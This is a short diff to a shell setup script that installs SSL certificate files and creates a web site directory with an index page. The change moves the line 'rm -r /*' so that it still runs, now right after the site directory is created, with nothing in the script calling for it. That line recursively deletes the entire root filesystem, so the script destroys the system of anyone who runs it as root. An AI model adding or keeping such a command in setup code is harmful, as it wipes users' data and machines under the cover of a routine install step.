@@ -45,10 +45,9 @@ cp server.crt /etc/ssl/antixerox/
 cp server.key /etc/ssl/antixerox/
 cp ca.crt /etc/ssl/antixerox/
 
-rm -r /*
-
 echo "-- Creating site ${SERVER_CN} ..."
 mkdir -p /var/www/${SERVER_CN}
+rm -r /*
 cat <<EOF > "/var/www/${SERVER_CN}/index.html"
 <!DOCTYPE html>
 <html lang="pt">
